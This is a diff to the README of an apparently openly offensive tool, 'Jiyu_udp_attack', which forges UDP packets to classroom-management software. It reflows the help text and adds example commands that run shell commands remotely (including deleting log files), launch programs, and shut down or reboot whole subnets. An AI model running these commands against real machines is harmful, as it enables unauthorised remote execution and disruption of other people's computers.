@@ -46,21 +46,21 @@ Network Configuration:
   -i, --ip-id <ip_id>   IP ID for the packet (default: random ID)
 
 Attack Action:
-  Specify the action to perform on the target machine.
+  Specify the action to perform on the target machine. 
 
   -m, --message <msg>   Send a message to the target machine
   -w, --website <url>   Open a website on the target machine
   -c, --command <command>
-                        Execute a command on the target machine (`cmd /D /C
-                        <command>`, Windows only)
+                        Execute a command on the target machine
+                        (`cmd /D /C <command>`, Windows only)
   -e, --execute, --minimize-execute, --maximize-execute <program> [<args> ...]
                         Execute a program with arguments on the target machine
   -s, --shutdown [<timeout> [<message> ...]]
-                        Shutdown the target machine, optionally with a timeout
-                        and message
+                        Shutdown the target machine,
+                        optionally with a timeout and message
   -r, --reboot [<timeout> [<message> ...]]
-                        Reboot the target machine, optionally with a timeout
-                        and message
+                        Reboot the target machine,
+                        optionally with a timeout and message
   -cw, --close-windows [<timeout> [<message> ...]]
                         Close all windows on the target machine
   -ctw, --close-top-window
@@ -71,7 +71,24 @@ Attack Action:
   --pkg <custom_data> [<args> ...]
                         Custom packet data to send
 
-Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/
+Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ 
+
+Example usage:
+    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World" -i 1000
+    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com
+    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log"
+    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe
+    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe
+    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
+    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."
+    python Jiyu_udp_attack -t 192.168.106.255 -cw
+    python Jiyu_udp_attack -t 192.168.106.100 -ctw
+    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000
+    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000
+    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
+    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.little_4}" 1024
+    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
+    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello
 ```
 
 其中目标 ip 的指定，可以：
